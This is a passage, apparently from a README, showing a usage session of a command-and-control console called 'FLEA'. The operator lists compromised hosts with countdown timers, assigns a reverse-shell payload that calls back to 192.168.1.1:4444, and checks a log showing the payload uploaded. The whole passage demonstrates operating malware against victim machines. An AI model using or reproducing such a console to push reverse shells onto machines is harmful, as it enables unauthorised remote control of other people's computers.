the shell like this:
```
FLEA

flea> show
id	|ip		|hostname	|OS	|count down		|message
1	 192.168.1.2	 pc1		 6.0	  00 days 03:00:00
2	 192.168.1.3	 pc2		 5.1	 *05 days 12:00:01
flea> post -p xxxx 1
payload named `xxxx' not found.
flea> post -p reverse_shell -c "192.168.1.1:4444" 1
flea> show 1
id	|ip		|hostname	|OS	|count down		|payload
0	 192.168.1.2	 pc1		 6.0	  00 days 03:00:00	 reverse_shell
flea> log -n
listening . . .
01-22-2018 18:08:08	[1:192.168.1.1:pc1]	reverse_shell uploaded.
^C
flea> log
xxxxxxxxxxxxx
xxxxxxxxxxxxx
xxxxxxxxxxxxx
xxxxxxxxxxxxx
xxxxxxxxxxxxx
total 5.
flea> quit

```
